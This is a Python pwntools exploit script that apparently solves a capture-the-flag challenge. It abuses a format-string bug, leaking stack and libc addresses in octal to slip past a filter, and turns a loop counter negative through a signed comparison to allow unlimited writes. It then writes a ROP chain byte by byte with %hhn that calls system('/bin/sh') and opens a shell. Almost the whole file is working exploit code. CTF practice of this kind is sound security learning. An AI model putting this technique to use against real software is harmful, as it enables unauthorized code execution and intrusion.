#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF("chall_patched")
libc = ELF("./libc.so.6")

gs = '''
b main
b vuln
'''
def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    if args.REMOTE:
        return remote("address", 12345)
    else:
        return process(elf.path)

# Plan:
# Everything is filtered, this time we need to use %o and leak in octal format.
# Then we just have to convert it.

# Addresses
fgets_off = 0x81600

# Functions
def leak():
    io.sendlineafter(b">> ", b"1")
    io.recvuntil(b"Have this: ")
    fgets = io.recvline().strip()
    fgets = int(fgets, 16)
    io.sendlineafter(b">> ", b"2")
    io.sendlineafter(b">> ", b"%12$llo") # Big o for octal format is not filtered
    stack = io.recvline().strip()
    stack = int(stack, 8)
    return stack, fgets


def writeb(value, target):
    io.sendlineafter(b">> ", b"2")
    payload = f"%{value}c%8$hhn".encode()
    padding = 16-len(payload)
    payload += b"B"*padding
    payload += p64(target)
    io.sendlineafter(b">> ", payload)


io = start()

stack, fgets = leak()

log.info("Stack leak: %s" % hex(stack))
stack_base = stack - 0x50
log.info("Stack base: %s" % hex(stack_base))
log.info("Fgets: %s" % hex(fgets))
libc.address = fgets - fgets_off
log.info("Libc base: %s" % hex(libc.address))
counter = stack - 0xc
log.info("Counter: %s"% hex(counter))

target = stack_base + 0x58  # pop rdi ret __libc_start_call_main, %17 on the stack
target1 = stack_base + 0x60 # *binsh
target2 = stack_base + 0x68 # ret
target3 = stack_base + 0x70 # system

"""
one_off2 = 0xeb58e
one_gadget = libc.address + one_off2
log.info("One gadget: %s" % hex(one_gadget))
str_gadget = str(one_gadget)
last_8_chars = str_gadget[-8:]
int_gadget = int(last_8_chars, 16)
log.info("payload: %s" % hex(int_gadget))
"""



# use rop for automation
rop = ROP(libc)

pop_rdi_ret = rop.find_gadget(["pop rdi", "ret"])[0] # first elem in rop result is addr
ret = rop.find_gadget(["ret"])[0]
binsh = next(libc.search(b"/bin/sh")) # binsh found in the binary
system = libc.sym.system


offset = 6 # rsp is %6 on x86-64

# Counter is doing signed comparrison so we just have to set MSB to 1 for it to be a negative
# number and then we can do as many writes as we want

writeb(128, counter+3) # 128 is 1000000 in binary with msb = 1

i = 0
for elem in p64(pop_rdi_ret):
    if elem == 0:
        continue
    writeb(elem, target+i)
    i += 1

i = 0
for elem in p64(binsh):
    if elem == 0:
        continue
    writeb(elem, target1+i)
    i += 1

i = 0
for elem in p64(ret):
    if elem == 0:
        continue
    writeb(elem, target2+i)
    i += 1

i = 0
for elem in p64(system):
    if elem == 0:
        continue
    writeb(elem, target3+i)
    i += 1


io.interactive()
